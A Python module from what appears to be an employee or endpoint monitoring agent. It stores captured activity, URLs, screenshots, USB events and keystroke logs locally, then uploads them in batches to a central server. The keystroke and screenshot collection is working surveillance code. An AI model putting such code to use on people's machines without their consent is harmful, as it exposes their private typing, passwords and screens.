# agent/modules/hybrid_flush.py  — used when MODE = "hybrid"
# Every LOCAL_FLUSH_EVERY: drain buffers to local DB
# Every UPLOAD_EVERY: read unsynced records from DB and upload to server

import os, sys, glob, time, json, base64, logging, threading, sqlite3
from datetime import datetime, timezone
import requests

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import config
from modules import activity, url_tracker, app_blocker, usb_guard, keylogger, local_store

logger = logging.getLogger("hybrid_flush")

_session = requests.Session()
_session.headers.update({
    "Authorization": f"Bearer {config.API_KEY}",
    "Content-Type":  "application/json",
    "X-Machine":     config.MACHINE_NAME,
})


def _get_cursor(table: str) -> int:
    c = sqlite3.connect(config.LOCAL_DB_PATH)
    row = c.execute("SELECT value FROM meta WHERE key=?", (f"cursor_{table}",)).fetchone()
    c.close()
    return int(row[0]) if row else 0


def _set_cursor(table: str, last_id: int):
    c = sqlite3.connect(config.LOCAL_DB_PATH)
    c.execute("INSERT OR REPLACE INTO meta (key,value) VALUES (?,?)",
              (f"cursor_{table}", str(last_id)))
    c.commit(); c.close()


def _flush_screenshots_local():
    for path in sorted(glob.glob(os.path.join(config.SCREENSHOT_DIR, "*.jpg"))):
        try:
            fname = os.path.basename(path)
            parts = fname.replace(".jpg","").split("_")
            if len(parts) >= 3:
                try:
                    dt = datetime.strptime(f"{parts[1]}_{parts[2]}", "%Y%m%d_%H%M%S")
                    captured = dt.strftime("%Y-%m-%dT%H:%M:%S")
                except Exception:
                    captured = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S")
            else:
                captured = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S")
            reason = parts[3] if len(parts) >= 4 else "scheduled"
            local_store.save_screenshot(config.MACHINE_NAME, path, captured, reason)
        except Exception as e:
            logger.error(f"Screenshot flush error: {e}")


def _local_flush():
    try:
        local_store.save_activity(activity.flush())
        local_store.save_urls(url_tracker.flush())
        local_store.save_app_violations(app_blocker.flush())
        local_store.save_usb_events(usb_guard.flush())
        local_store.save_keylog(keylogger.flush())
        _flush_screenshots_local()
    except Exception as e:
        logger.error(f"Local flush error: {e}")


def _read_unsynced(c, table, cols, cursor, limit=500):
    col_str = ", ".join(cols)
    return c.execute(
        f"SELECT id,{col_str} FROM {table} WHERE id>? ORDER BY id LIMIT ?",
        (cursor, limit)
    ).fetchall()


def _upload():
    if not os.path.isfile(config.LOCAL_DB_PATH):
        return
    try:
        c = sqlite3.connect(config.LOCAL_DB_PATH, timeout=15)
    except Exception as e:
        logger.error(f"DB open error: {e}"); return

    payload = {"machine": config.MACHINE_NAME,
               "uploaded_utc": datetime.now(timezone.utc).isoformat(),
               "activity":[], "urls":[], "screenshots":[],
               "app_violations":[], "usb_events":[], "keylog":[]}
    cursors = {}

    rows = _read_unsynced(c, "activity_events",
        ["machine","app","exe","window_title","start_utc","end_utc","idle"],
        _get_cursor("activity_events"))
    for r in rows:
        payload["activity"].append({"machine":r[1],"app":r[2],"exe":r[3],
            "window_title":r[4],"start_utc":r[5],"end_utc":r[6],"idle":bool(r[7])})
    if rows: cursors["activity_events"] = rows[-1][0]

    rows = _read_unsynced(c, "url_visits",
        ["machine","browser","url","title","visited_utc"], _get_cursor("url_visits"))
    for r in rows:
        payload["urls"].append({"machine":r[1],"browser":r[2],"url":r[3],
                                "title":r[4],"visited_utc":r[5]})
    if rows: cursors["url_visits"] = rows[-1][0]

    rows = _read_unsynced(c, "screenshots",
        ["machine","filename","captured_utc","reason","image_data"], _get_cursor("screenshots"))
    for r in rows:
        if r[5]:
            payload["screenshots"].append({"machine":r[1],"filename":r[2],
                "captured_utc":r[3],"reason":r[4],"data_b64":base64.b64encode(r[5]).decode()})
    if rows: cursors["screenshots"] = rows[-1][0]

    rows = _read_unsynced(c, "app_violations",
        ["machine","app_name","exe_path","username","pid","killed","detected_utc","severity"],
        _get_cursor("app_violations"))
    for r in rows:
        payload["app_violations"].append({"machine":r[1],"app_name":r[2],"exe_path":r[3],
            "username":r[4],"pid":r[5],"killed":bool(r[6]),"detected_utc":r[7],"severity":r[8]})
    if rows: cursors["app_violations"] = rows[-1][0]

    rows = _read_unsynced(c, "usb_events",
        ["machine","drive_letter","volume_serial","device_serial","whitelisted","action","detected_utc","severity"],
        _get_cursor("usb_events"))
    for r in rows:
        payload["usb_events"].append({"machine":r[1],"drive_letter":r[2],"volume_serial":r[3],
            "device_serial":r[4],"whitelisted":bool(r[5]),"action":r[6],"detected_utc":r[7],"severity":r[8]})
    if rows: cursors["usb_events"] = rows[-1][0]

    rows = _read_unsynced(c, "keylog_sessions",
        ["machine","app","text_enc","start_utc","end_utc"], _get_cursor("keylog_sessions"))
    for r in rows:
        payload["keylog"].append({"machine":r[1],"app":r[2],"text_enc":r[3],
                                  "start_utc":r[4],"end_utc":r[5]})
    if rows: cursors["keylog_sessions"] = rows[-1][0]
    c.close()

    total = sum(len(v) for v in payload.values() if isinstance(v, list))
    if total == 0:
        logger.info("Nothing new to upload.")
        return

    logger.info(f"Uploading {total} records ({len(payload['screenshots'])} screenshots)...")
    try:
        resp = _session.post(f"{config.SERVER_URL}/api/ingest", json=payload, timeout=120)
        if resp.status_code == 200:
            for table, last_id in cursors.items():
                _set_cursor(table, last_id)
            logger.info(f"Upload success: {resp.json().get('saved',{})}")
        else:
            logger.warning(f"Upload failed: HTTP {resp.status_code}")
    except requests.exceptions.ConnectionError:
        logger.warning("Upload failed: server unreachable. Will retry next cycle.")
    except Exception as e:
        logger.error(f"Upload error: {e}")


def _local_loop():
    while True:
        time.sleep(config.LOCAL_FLUSH_EVERY)
        _local_flush()


def _upload_loop():
    time.sleep(300)
    while True:
        _upload()
        time.sleep(config.UPLOAD_EVERY)


def start():
    local_store.init_db()
    t1 = threading.Thread(target=_local_loop,  daemon=True, name="LocalFlushThread")
    t2 = threading.Thread(target=_upload_loop, daemon=True, name="UploadThread")
    t1.start(); t2.start()
    logger.info(f"Hybrid flush started.")
